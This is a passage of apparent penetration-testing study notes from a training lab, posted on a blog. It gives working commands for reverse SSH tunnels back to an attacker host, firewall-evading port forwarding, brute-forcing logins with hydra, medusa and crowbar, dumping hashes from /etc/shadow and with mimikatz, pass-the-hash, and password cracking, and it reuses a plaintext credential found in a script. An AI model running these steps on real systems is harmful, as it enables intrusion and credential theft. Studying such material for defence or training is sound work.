-tulpn</span><br><span class="line"></span><br><span class="line">cat &#x2F;etc&#x2F;fstab</span><br><span class="line"></span><br><span class="line">UUID&#x3D;ede2f74e-f23a-441c-b9cb-156494837ef3	&#x2F;	ext4	rw,relatime 0 1</span><br><span class="line">UUID&#x3D;8e53ca17-9437-4f54-953c-0093ce5066f2	&#x2F;boot	ext4	rw,relatime 0 2</span><br><span class="line">UUID&#x3D;ed8db3c1-a3c8-45fb-b5ec-f8e1529a8046	swap	swap	defaults	0 0</span><br><span class="line">&#x2F;dev&#x2F;cdrom	&#x2F;media&#x2F;cdrom	iso9660	noauto,ro 0 0</span><br><span class="line">&#x2F;dev&#x2F;usbdisk	&#x2F;media&#x2F;usb	vfat	noauto	0 0</span><br><span class="line">&#x2F;&#x2F;10.5.5.20&#x2F;Scripts    &#x2F;mnt&#x2F;scripts    cifs    uid&#x3D;0,gid&#x3D;0,username&#x3D;,password&#x3D;,_netdev 0 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>The contents of /etc/fstab are interesting. A share is mounted from the 10.5.5.20 host. Let’s poke<br>around the scripts share and see what we find.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;mnt&#x2F;scripts</span><br><span class="line"></span><br><span class="line">cat system_report.ps1</span><br><span class="line"># find a better way to automate this</span><br><span class="line">$username &#x3D; &quot;sandbox\alex&quot;</span><br><span class="line">$pwdTxt &#x3D; &quot;Ndawc*nRoqkC+haZ&quot;</span><br><span class="line">$securePwd &#x3D; $pwdTxt | ConvertTo-SecureString </span><br><span class="line">$credObject &#x3D; New-Object System.Management.Automation.PSCredential -ArgumentList $username, $securePwd</span><br><span class="line"></span><br><span class="line"># Enable remote management on Poultry</span><br><span class="line">$remoteKeyParams &#x3D; @&#123;</span><br><span class="line">ComputerName &#x3D; &quot;POULTRY&quot;</span><br><span class="line">Path &#x3D; &#39;HKLM:\SOFTWARE\Microsoft\WebManagement\Server&#39;</span><br><span class="line">Name &#x3D; &#39;EnableRemoteManagement&#39;</span><br><span class="line">Value &#x3D; &#39;1&#39; </span><br><span class="line">&#125;</span><br><span class="line">Set-RemoteRegistryValue @remoteKeyParams -Credential $credObject</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="Create-a-stable-reverse-tunnel"><a href="#Create-a-stable-reverse-tunnel" class="headerlink" title="Create a stable reverse tunnel"></a>Create a stable reverse tunnel</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;.ssh&#x2F;id_rsa</span><br><span class="line"></span><br><span class="line">from&#x3D;&quot;10.11.1.250&quot;,command&#x3D;&quot;echo &#39;This account can only be used for port</span><br><span class="line">forwarding&#39;&quot;,no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBVu1YocyTb1VTj7tkgBdqpqU&#x2F;YQoKSTEC3btRPoWDs8s4oCkYNU4nuehdUn8NFeBPSABqrPq7oBu20jJVD+BWdsXUVkTqCeQr4iz1owud1GsE7QbkHiWXmkNjLqzDTnJqL9Tp1cSdIx7Ekwc9ETtQlmAaR3YRA0Ryd2JR1Mv8edE43Fhh9LGVeW&#x2F;97hI6DeYOvA3+bODxd9hkqwnOyDqB5RzMEcu6q98sysp31QbiJ17LH1Rr5fkdUUmVZtdwlByu8heB5UrDW1UJUa0GoHmh&#x2F;nzwxD6+9eazK&#x2F;XNGp6&#x2F;pOPhd2zag99IMMtTkypx6mguFYy3mIgkI&#x2F;h5C46xJTOUz&#x2F;xQ2LwGb8+PWmBXHDcnbL85y4p1yyoUM5oBd+Fb6DThYnKmwVtvUb0VrEcN03JZ9QepkvdE84eUzqBdbWBjTzhgHTLFRJeMQM2sUt7vBcOB2XmuTk3md&#x2F;O8V7wQuSgXDk8vyz4h&#x2F;iSCu8UaLJx0CnJ5AdtIUeIBzgFWf1hJnWE&#x3D; mysql@zora</span><br></pre></td></tr></table></figure>

<h2 id="Dynamic-port-forwarding"><a href="#Dynamic-port-forwarding" class="headerlink" title="Dynamic port forwarding"></a>Dynamic port forwarding</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -f -N -R 1080 -o &quot;UserKnownHostsFile&#x3D;&#x2F;dev&#x2F;null&quot; -o &quot;StrictHostKeyChecking&#x3D;no&quot; -i &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;.ssh&#x2F;id_rsa kali@192.168.119.165</span><br></pre></td></tr></table></figure>

<p>add to /etc/proxychains4.conf</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks4 127.0.0.1 1080</span><br></pre></td></tr></table></figure>

<h2 id="Targeting-Poultry"><a href="#Targeting-Poultry" class="headerlink" title="Targeting Poultry"></a>Targeting Poultry</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap --top-ports&#x3D;20 -sT -Pn 10.5.5.20</span><br><span class="line">PORT     STATE  SERVICE</span><br><span class="line">21&#x2F;tcp   closed ftp</span><br><span class="line">22&#x2F;tcp   closed ssh</span><br><span class="line">23&#x2F;tcp   closed telnet</span><br><span class="line">25&#x2F;tcp   closed smtp</span><br><span class="line">53&#x2F;tcp   closed domain</span><br><span class="line">80&#x2F;tcp   closed http</span><br><span class="line">110&#x2F;tcp  closed pop3</span><br><span class="line">111&#x2F;tcp  closed rpcbind</span><br><span class="line">135&#x2F;tcp  open   msrpc</span><br><span class="line">139&#x2F;tcp  open   netbios-ssn</span><br><span class="line">143&#x2F;tcp  closed imap</span><br><span class="line">443&#x2F;tcp  closed https</span><br><span class="line">445&#x2F;tcp  open   microsoft-ds</span><br><span class="line">993&#x2F;tcp  closed imaps</span><br><span class="line">995&#x2F;tcp  closed pop3s</span><br><span class="line">1723&#x2F;tcp closed pptp</span><br><span class="line">3306&#x2F;tcp closed mysql</span><br><span class="line">3389&#x2F;tcp open   ms-wbt-server</span><br><span class="line">5900&#x2F;tcp closed vnc</span><br><span class="line">8080&#x2F;tcp closed http-proxy</span><br></pre></td></tr></table></figure>
<p>-sT TCP connect<br>-Pn no ping</p>
<p>port <code>3389</code> <code>ms-wbt-server</code> is the rdp server  </p>
<p>login with the credential we have</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains xfreerdp &#x2F;d:sandbox &#x2F;u:alex &#x2F;v:10.5.5.20 +clipboard</span><br></pre></td></tr></table></figure>
<p>/d: domain<br>/u: user<br>/v: server host</p>
<p>let me try rdesktop first</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains rdesktop 10.5.5.20 -d sandbox -u alex -p &#39;Ndawc*nRoqkC+haZ&#39; -g 1024x768 -r clipboard:PRIMARYCLIPBOARD</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\alex&gt;systeminfo</span><br><span class="line">Host Name: POULTRY</span><br><span class="line">OS Name: Microsoft Windows 7 Professional</span><br><span class="line">OS Version: 6.1.7601 Service Pack 1 Build 7601</span><br><span class="line">...</span><br><span class="line">Registered Owner: poultryadmin</span><br><span class="line">...</span><br><span class="line">Domain: sandbox.local</span><br><span class="line"></span><br><span class="line">netstat -ano</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>nothing interesting for the opening port, Ports 49152 and above<br>are the Windows default dynamic/ephemeral ports for establishing TCP connections and we<br>don’t need to worry about them</p>
<p>check if alex is in admin group</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Global Group memberships *Domain Users</span><br></pre></td></tr></table></figure>
<p>it is a regular domain user</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/07/09/Study-Notes-2021-07-08/">Study Notes - 2021/07/08</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-07-08</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="Http-tunneling-through-deep-packet-inspection"><a href="#Http-tunneling-through-deep-packet-inspection" class="headerlink" title="Http tunneling through deep packet inspection"></a>Http tunneling through deep packet inspection</h1><p>Senario: only a specific protocal is allowed. E.g. ssh protocal is not allowed. and theres a deep packet inspection in the firewall that only allow http packet. An unused port 1234 is open by misconfiguration (unusal in real case)<br>port 3389 remote desktop prot </p>
<p>On compromised linux machine:   </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 0.0.0.0:8888:w.x.y.z:3389 student@127.0.0.1  </span><br></pre></td></tr></table></figure>

<p>it is not restricted since they both in the internal subnet  </p>
<p>encapsulate the tunnel within http package</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install httptunnel</span><br></pre></td></tr></table></figure>

<p>http tunnel is server-client based, on compromised linux:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">student@debian:~$ hts --forward-port localhost:8888 1234</span><br></pre></td></tr></table></figure>
<p>on kali:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ htc --forward-port 8080 10.11.0.128:1234</span><br></pre></td></tr></table></figure>


</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/07/08/Study-Notes-2021-07-07/">Study Notes - 2021/07/07</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-07-07</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="Port-Forwarding"><a href="#Port-Forwarding" class="headerlink" title="Port Forwarding"></a>Port Forwarding</h1><h2 id="RINETD"><a href="#RINETD" class="headerlink" title="RINETD"></a>RINETD</h2><p>Default configuration file: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;rinetd.conf</span><br></pre></td></tr></table></figure>

<p>bind address, bind port: listening address/port  connect address/port: destination  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># bindadress bindport connectaddress connectport</span><br><span class="line">0.0.0.0 80 216.58.207.142 80</span><br></pre></td></tr></table></figure>
<p>forword any connection to port 80 to google  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo service rinetd restart</span><br><span class="line">ss -antp | grep &quot;80&quot;</span><br><span class="line">nc -nvv 10.11.0.4 80</span><br></pre></td></tr></table></figure>

<h1 id="SSH-Tunneling"><a href="#SSH-Tunneling" class="headerlink" title="SSH Tunneling"></a>SSH Tunneling</h1><h2 id="SSH-local-port-forwarding"><a href="#SSH-local-port-forwarding" class="headerlink" title="SSH local port forwarding"></a>SSH local port forwarding</h2><p>Senario:<br>victim1 already compromised, only accpet 8080, 22, 3389 port from outside. victim1 conenct to another subnetwork contains another target. Move tools to victim1 is not eligent and scalable, want to attack from our kali machine  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-L local_socket:host:hostport</span><br><span class="line">-L local_socket:remote_socket</span><br><span class="line">             Specifies that connections to the given TCP port or Unix socket</span><br><span class="line">             on the local (client) host are to be forwarded to the given host</span><br><span class="line">             and port, or Unix socket, on the remote side.  This works by al‐</span><br><span class="line">             locating a socket to listen to either a TCP port on the local</span><br><span class="line">             side, optionally bound to the specified bind_address, or to a</span><br><span class="line">             Unix socket.  Whenever a connection is made to the local port or</span><br><span class="line">             socket, the connection is forwarded over the secure channel, and</span><br><span class="line">             a connection is made to either host port hostport, or the Unix</span><br><span class="line">             socket remote_socket, from the remote machine.</span><br><span class="line"></span><br><span class="line">-N      Do not execute a remote command.  This is useful for just for‐</span><br><span class="line">             warding ports.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In our scenario, we want to forward port 445 (Microsoft networking without NetBIOS) on our Kali</span><br><span class="line">machine to port 445 on the Windows Server 2016 target. When we do this, any Microsoft file</span><br><span class="line">sharing queries directed at our Kali machine will be forwarded to our Windows Server 2016 target.</span><br><span class="line">This seems impossible given that the firewall is blocking traffic on TCP port 445, but this port</span><br><span class="line">forward is tunneled through an SSH session to our Linux target on port 22, which is allowed</span><br><span class="line">through the firewall. In summary, the request will hit our Kali machine on port 445, will be</span><br><span class="line">forwarded across the SSH session, and will then be passed on to port 445 on the Windows Server</span><br><span class="line">2016 target.</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128</span><br></pre></td></tr></table></figure>

<h1 id="SSH-Remote-port-forwarding"><a href="#SSH-Remote-port-forwarding" class="headerlink" title="SSH Remote port forwarding"></a>SSH Remote port forwarding</h1><p>Senario:  </p>
<p>the firewall is blocking inbound TCP port 22 (SSH) connections, so we can’t<br>SSH into this server from our Internet-connected Kali machine</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">victim1: ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4</span><br></pre></td></tr></table></figure>

<p>forword all 10.11.0.4:2221 request from kali machien to 127.0.0.1:3306</p>
<p>on kali:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap -sS -sV 127.0.0.1 -p 2221</span><br><span class="line">Nmap scan report for localhost (127.0.0.1)</span><br><span class="line">Host is up (0.000039s latency).</span><br><span class="line">PORT STATE SERVICE VERSION</span><br><span class="line">2221&#x2F;tcp open mysql MySQL 5.5.5-10.1.26-MariaDB-0+deb9u1</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.56 seconds</span><br></pre></td></tr></table></figure>

<p>scan local port will scan target host  </p>
<h1 id="SSH-Dynamic-port-forwarding"><a href="#SSH-Dynamic-port-forwarding" class="headerlink" title="SSH Dynamic port forwarding"></a>SSH Dynamic port forwarding</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali&gt; ssh -N -D &lt;address to bind to&gt;:&lt;port to bind to&gt; &lt;username&gt;@&lt;SSH server address&gt;</span><br></pre></td></tr></table></figure>
<p>With the above syntax in mind, we can create a local SOCKS4 application proxy (-N -D) on our<br>Kali Linux machine on TCP port 8080 (127.0.0.1:8080), which will tunnel all incoming traffic to<br>any host in the target network, through the compromised Linux machine, which we log into as<br>student</p>
<p>We can run any network application through HTTP, SOCKS4, and SOCKS5<br>proxies with the help of ProxyChains</p>
<p>add to <code>/etc/proxychains.conf</code>  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks4 127.0.0.1 8080</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo proxychains nmap --top-ports&#x3D;20 -sT -Pn 192.168.1.110</span><br></pre></td></tr></table></figure>

<h1 id="PLINK-exe"><a href="#PLINK-exe" class="headerlink" title="PLINK.exe"></a>PLINK.exe</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4</span><br></pre></td></tr></table></figure>
<p>if it is the first time, it will attmpt to cache the host key and there’s a interactive step y/n</p>
<p>solution: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe &#x2F;c echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4</span><br></pre></td></tr></table></figure>

<h1 id="netSH"><a href="#netSH" class="headerlink" title="netSH"></a>netSH</h1><p>use netsh to do port forwarding on windows, it is installed on windows by default. </p>
<p>However, for this to work, the Windows system must have the IP Helper service running and IPv6<br>support must be enabled for the interface we want to use. Fortunately, both are on and enabled<br>by default on Windows operating systems.  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport&#x3D;4455 listenaddress&#x3D;10.11.0.22 connectport&#x3D;445 connectaddress&#x3D;192.168.1.110</span><br><span class="line">netstat -anp TCP | find &quot;4455&quot; </span><br></pre></td></tr></table></figure>

<p>By default, firewall does not allow inbound connection to 4455, however, we have system privilege, we can change the firewall configuration  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;forward_port_rule&quot; protocol&#x3D;TCP dir&#x3D;in localip&#x3D;10.11.0.22 localport&#x3D;4455 action&#x3D;allow</span><br></pre></td></tr></table></figure>

<p>before using smbclient, smb need to be configured with min protocal level = smbv2 and restart </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;samba&#x2F;smb.conf</span><br><span class="line">min protocol &#x3D; SMB2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sudo &#x2F;etc&#x2F;init.d&#x2F;smbd restart</span><br><span class="line">smbclient -L 10.11.0.22 --port&#x3D;4455 --user&#x3D;Administrator</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/07/07/Study-Notes-2021-07-06/">Study Notes - 2021/07/06</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-07-06</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="HTTP-htaccess-password-attack-with-medusa"><a href="#HTTP-htaccess-password-attack-with-medusa" class="headerlink" title="HTTP htaccess password attack with medusa"></a>HTTP htaccess password attack with medusa</h1><p>decompress the rockyou wordlist:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gunzip &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">medusa -h 10.11.0.22 -u admin -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -M http -m DIR:&#x2F;admin</span><br></pre></td></tr></table></figure>

<h1 id="password-Attack-against-Remote-Desktop-Protocal-with-crowbar"><a href="#password-Attack-against-Remote-Desktop-Protocal-with-crowbar" class="headerlink" title="password Attack against Remote Desktop Protocal with crowbar"></a>password Attack against Remote Desktop Protocal with crowbar</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crowbar -b rdp -s 10.11.0.22&#x2F;32 -u admin -C ~&#x2F;password-file.txt -n 1  </span><br></pre></td></tr></table></figure>

<p>-n number of threads<br>-b protocal<br>-s host<br>-u username<br>-C wordlist  </p>
<p>rdp does not reliably handle multiple threads, so we use single thread </p>
<h1 id="SSH-Attack-with-THC-Hydra"><a href="#SSH-Attack-with-THC-Hydra" class="headerlink" title="SSH Attack with THC-Hydra"></a>SSH Attack with THC-Hydra</h1><p>-l target username<br>-P wordlist<br>protocal://IP  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l kali -P test_wdlist.txt ssh:&#x2F;&#x2F;127.0.0.1</span><br></pre></td></tr></table></figure>



<h1 id="HTTP-post-attack-with-THC-Hydra"><a href="#HTTP-post-attack-with-THC-Hydra" class="headerlink" title="HTTP post attack with THC-Hydra"></a>HTTP post attack with THC-Hydra</h1><p>obtain addtional info about http-form-post options</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra http-form-post -U </span><br><span class="line"></span><br><span class="line">&lt;url&gt;:&lt;form parameters&gt;:&lt;condition string&gt;[:&lt;optional&gt;[:&lt;optional&gt;]</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra 10.11.0.22 http-form-post &quot;&#x2F;form&#x2F;frontpage.php:user&#x3D;admin&amp;pass&#x3D;^PASS^:INVALID LOGIN&quot; -l admin -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -vV -f</span><br></pre></td></tr></table></figure>
<p>request verbose output with -vV, and use -f to stop the attack when the first successful result is found.</p>
<h1 id="Retrieve-Password-hashes"><a href="#Retrieve-Password-hashes" class="headerlink" title="Retrieve Password hashes"></a>Retrieve Password hashes</h1><p><code>hashid &lt;hashvalue&gt;</code> to identify hash type  </p>
<p>inspect /etc/shadow file </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo grep root &#x2F;etc&#x2F;shadow</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:$6$18cMHZ.mB57eU82l$lim7jazX00mXUZEB43IOtlHmpFcuTrceOJ1QObdaGr5fwsfsEryh5xcuJEpH7qOyiOmQHcGkn33vhy66GQDAi1:18696:0:99999:7:::</span><br></pre></td></tr></table></figure>
<p>the first of which ($6) references the SHA-512 algorithm  </p>
<ul>
<li>$1 = MD5 hashing algorithm.</li>
<li>$2 =Blowfish Algorithm is in use.</li>
<li>$2a=eksblowfish Algorithm</li>
<li>$5 =SHA-256 Algorithm</li>
<li>$6 =SHA-512 Algorithm<br>18cMHZ.mB57eU82l the salt  </li>
</ul>
<p>SAM database cannot be copied while the operating system is running because the Windows kernel keeps an exclusive file system lock on the file.</p>
<p>mimikatz modules facilitate password hash extraction from the Local Security Authority Subsystem (LSASS) process memory where they are cached.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Tools\password_attacks\mimikatz.exe</span><br><span class="line">&gt; privilege::debug</span><br><span class="line">&gt; token::elevate</span><br><span class="line">&gt; lsadump::sam</span><br></pre></td></tr></table></figure>
<p>token::elevate command to elevate the security token from high integrity (administrator) to SYSTEM integrity. If mimikatz is launched from a SYSTEM shell, this step is not required.  </p>
<p>use lsadump::sam to dump the contents of the SAM database</p>
<h1 id="Passing-the-hash-in-windows"><a href="#Passing-the-hash-in-windows" class="headerlink" title="Passing the hash in windows"></a>Passing the hash in windows</h1><p>The Pass-the-Hash (PtH) technique (discovered in 1997) allows an attacker to authenticate to a<br>remote target by using a valid combination of username and NTLM/LM hash rather than a clear<br>text password. This is possible because NTLM/LM password hashes are not salted and remain<br>static between sessions. Moreover, if we discover a password hash on one target, we cannot only<br>use it to authenticate to that target, we can use it to authenticate to another target as well, as long<br>as that target has an account with the same username and password.</p>
<p>Security Accounts Manager (SAM)  </p>
<p>To do this, we will use pth-winexe from the Passing-The-Hash toolkit (a modified version of winexe), which performs authentication using the SMB protocol</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e &#x2F;&#x2F;10.11.0.22 cmd</span><br></pre></td></tr></table></figure>

<p>Question: what does “aad3b435b51404eeaad3b435b51404ee” do ? why there are two hashes?<br>aad3b435b51404eeaad3b435b51404ee: Empty LM HASH <code>&lt;LM hash&gt;:&lt;NTLM hash&gt;</code>    </p>
<p>NTLM hash algorithn:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MD4(UTF-16-LE(password))</span><br></pre></td></tr></table></figure>

<p>Behind the scenes, the format of the NTLM hash we provided was changed into a NetNTLM<br>version 1 or 2 format during the authentication process. We can capture these hashes using<br>man-in-the-middle or poisoning attacks and either crack them or relay them</p>
<p><a target="_blank" rel="noopener" href="https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html">https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html</a>  </p>
<h1 id="Password-cracking"><a href="#Password-cracking" class="headerlink" title="Password cracking"></a>Password cracking</h1><p>recover clear text password from hash  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john hash.txt --format&#x3D;NT</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt hash.txt --format&#x3D;NT</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --rules --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt hash.txt --format&#x3D;NT</span><br></pre></td></tr></table></figure>

